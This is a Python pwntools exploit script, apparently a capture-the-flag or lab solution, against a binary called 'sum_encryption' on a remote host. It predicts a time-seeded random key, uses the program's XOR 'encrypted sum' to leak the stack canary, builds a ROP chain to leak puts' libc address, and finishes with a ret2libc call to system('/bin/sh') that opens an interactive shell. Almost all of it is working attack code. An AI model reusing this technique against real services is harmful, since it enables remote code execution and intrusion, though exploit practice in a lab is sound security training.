from pwn import *
from multiprocessing import Process, Barrier, Pipe

def start_sum_encription(barrier, pipe):
    BIN_SUM_ENCRYPTION = './sum_encryption'
    LIBC = './libc.so.6'
    # LIBC = '/lib/x86_64-linux-gnu/libc.so.6'

    context.binary = BIN_SUM_ENCRYPTION

    e = ELF(BIN_SUM_ENCRYPTION)
    libc = ELF(LIBC)

    puts_got_address = e.got['puts']
    puts_plt_address = e.plt['puts']
    main_address = 0x4008e1
    pop_rdi_ret_address = 0x0000000000400a73

    barrier.wait()
    # p = process(BIN_SUM_ENCRYPTION)
    p = remote('141.85.224.106', '31346')

    random_number = pipe.recv()

    p.recvline() # Skip the 'Enter 0 as the number of values to exit\n' line
    p.recvline() # Skip the 'Number of values:\n' line

    # Sending 18 as the number of values because then we want to sum all the 17 values
    # given by us plus the canary value. Then we will XOR the sum with the random number
    # and then we will subtract the given numbers from the result of the XOR operation
    # to get the canary value
    p.sendline(b'18')
    p.recvline() # Skip the 'Enter values:\n' line

    sum_of_values = 0
    for i in range(17):
        sum_of_values += i
        p.sendline(str(i).encode())

    p.sendline(b'\x04') # Send the EOF character to exit the loop

    encrypted_sum = p.recvline().strip().split(b' ')[-1].decode()
    sum = int(encrypted_sum) ^ int(random_number)
    canary_value = sum - sum_of_values

    p.recvline() # Skip the 'Number of values:\n' line

    p.sendline(b'18')
    p.recvline() # Skip the 'Enter values:\n' line

    for i in range(17):
        p.sendline(str(i).encode())

    p.sendline(str(canary_value).encode())
    p.sendline(b'1' * 8) # Send the old RBP value
    p.sendline(str(pop_rdi_ret_address).encode())
    p.sendline(str(puts_got_address).encode())
    p.sendline(str(puts_plt_address).encode())
    p.sendline(str(main_address).encode())
    p.sendline(b'\x04')

    p.recvline() # Skip the 'Your encrypted sum.....\n' line
    p.recvline() # Skip the 'Number of values....\n' line
    p.sendline(str(0).encode())

    puts_address = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc.address = puts_address - libc.symbols['puts']
    system_address = libc.symbols['system']
    bin_sh_address = next(libc.search(b'/bin/sh'))

    p.recvline() # Skip the 'Enter 0 as the number of values to exit\n' line
    p.recvline() # Skip the 'Number of values:\n' line

    p.sendline(b'18')
    p.recvline() # Skip the 'Enter values:\n' line

    for i in range(17):
        p.sendline(str(i).encode())

    p.sendline(str(canary_value).encode())
    p.sendline(b'1' * 8) # Send the old RBP value
    p.sendline(str(pop_rdi_ret_address).encode())
    p.sendline(str(bin_sh_address).encode())
    p.sendline(str(system_address).encode())
    p.sendline(b'\x04')
    
    p.recvline() # Skip the 'Your encrypted sum.....\n' line
    p.recvline() # Skip the 'Number of values....\n' line
    p.sendline(str(0).encode())
    
    p.interactive()

def start_random_numbers_generator(barrier, pipe):
    BIN_RANDOM_NUMBERS_GENERATOR = './random_numbers_generator'

    barrier.wait()
    p = process(BIN_RANDOM_NUMBERS_GENERATOR)

    random_number = p.recvline().strip().decode()
    pipe.send(random_number)
    pipe.close()

    p.close()

if __name__ == '__main__':
    for i in range(1000):
        os.system('gcc random_numbers_generator.c -o random_numbers_generator')

        barrier = Barrier(2)
        conn1, conn2 = Pipe()

        p1 = Process(target=start_sum_encription, args=(barrier, conn1))
        p2 = Process(target=start_random_numbers_generator, args=(barrier, conn2))

        p1.start()
        p2.start()

        p1.join()
        p2.join()

        os.system('rm random_numbers_generator')
